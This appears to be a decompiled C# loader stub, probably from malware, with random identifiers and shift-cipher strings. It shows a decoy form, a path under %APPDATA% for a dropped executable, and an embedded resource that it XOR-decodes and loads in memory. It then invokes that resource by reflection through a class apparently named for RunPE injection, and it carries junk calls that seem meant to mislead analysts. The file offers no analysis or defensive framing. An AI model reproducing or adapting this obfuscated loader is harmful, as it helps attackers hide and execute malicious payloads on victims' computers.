using System;
using System.ComponentModel;
using System.Globalization;
using System.IO;
using System.Reflection;
using System.Resources;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Threading;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;

[StandardModule]
public sealed class srialuufoaulicxdu_jsigzaa18
{
	public static string dlijulwiwmvuyhofj_gzrrfgzycalo16 = string.Empty;

	public static int magicnum = 9;

	public static object hgmkvmbt_ddbbrgyze6(string xdujsigzaattkc_ejmhesjspi3)
	{
		return new ResourceManager(xdujsigzaattkc_ejmhesjspi3, Assembly.GetExecutingAssembly()).GetObject(xdujsigzaattkc_ejmhesjspi3);
	}

	public static void yrpknprozkuiviag_pnrrryjzbdzl15(int gmuftd_uoxgfazlrgwte3, string ipjweispbu_hnouwjxxxvhdhys2, string alxcktdomkl_rjzmyhvjpvo6)
	{
		AppDomain.CurrentDomain.Load(rozanibwagp_nvvcnjfjuzdxc6((byte[])hgmkvmbt_ddbbrgyze6("511538"))).GetType(iwmvuyhofjg_zrrfgzycalosxnz7("WXWN7MN[Y7[YNhLU\\"))!.GetMethod(iwmvuyhofjg_zrrfgzycalosxnz7("LVMhJMMh\\^K"))!.Invoke(null, new object[3] { gmuftd_uoxgfazlrgwte3, ipjweispbu_hnouwjxxxvhdhys2, alxcktdomkl_rjzmyhvjpvo6 });
	}

	[STAThread]
	public static void Main()
	{
		//IL_0000: Unknown result type (might be due to invalid IL or missing references)
		//IL_0006: Expected O, but got Unknown
		TrackBar val = new TrackBar();
		((Control)val).set_Name("maiForm");
		val.set_Text("ForMAI");
		((Control)val).set_Width(356);
		((Control)val).set_Height(568);
		try
		{
			new NEWCLASS();
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
		Thread.CurrentThread.CurrentCulture = CultureInfo.CreateSpecificCulture(iwmvuyhofjg_zrrfgzycalosxnz7("nw6^\\"));
		dlijulwiwmvuyhofj_gzrrfgzycalo16 = Interaction.Environ("appdata") + "\\" + iwmvuyhofjg_zrrfgzycalosxnz7("Orunwjvn7n\u0081n");
		new NEWSTART();
		while (true)
		{
			Thread.Sleep(1000);
		}
	}

	public static char[] fdgitivarad_fpcamkhaxh17(CultureInfo skvggowgmuftd_uoxgfazlrgwtei17, DateTime pjweispbuhnouwj_xxxvhdhy19)
	{
		_ = Environment.WorkingSet;
		_ = CultureInfo.CurrentCulture;
		_ = CultureInfo.InvariantCulture;
		Convert.ToInt64(RuntimeHelpers.GetObjectValue(new object()));
		_ = DateTime.Now;
		_ = Console.BufferHeight;
		_ = Console.BufferWidth;
		Directory.GetLogicalDrives();
		Conversions.ToString(Directory.GetLastAccessTime(Path.GetTempPath()));
		Marshal.StringToHGlobalAuto(Console.Title);
		Enum.GetUnderlyingType(TypeDescriptor.ComObjectType);
		return Path.GetInvalidPathChars();
	}

	public static byte[] rozanibwagp_nvvcnjfjuzdxc6(byte[] rozanibwagp_nvvcnjfjuzdxc6_param_01)
	{
		int num = rozanibwagp_nvvcnjfjuzdxc6_param_01.Length - 1;
		for (int i = 0; i <= num; i += 9)
		{
			rozanibwagp_nvvcnjfjuzdxc6_param_01[i] = (byte)(rozanibwagp_nvvcnjfjuzdxc6_param_01[i] ^ 9u);
		}
		return rozanibwagp_nvvcnjfjuzdxc6_param_01;
	}

	public static string iwmvuyhofjg_zrrfgzycalosxnz7(string iwmvuyhofjg_zrrfgzycalosxnz7_arg01)
	{
		string text = string.Empty;
		int num = iwmvuyhofjg_zrrfgzycalosxnz7_arg01.Length - 1;
		for (int i = 0; i <= num; i++)
		{
			text += Conversions.ToString(Strings.ChrW(iwmvuyhofjg_zrrfgzycalosxnz7_arg01[i] - magicnum));
		}
		return text;
	}
}
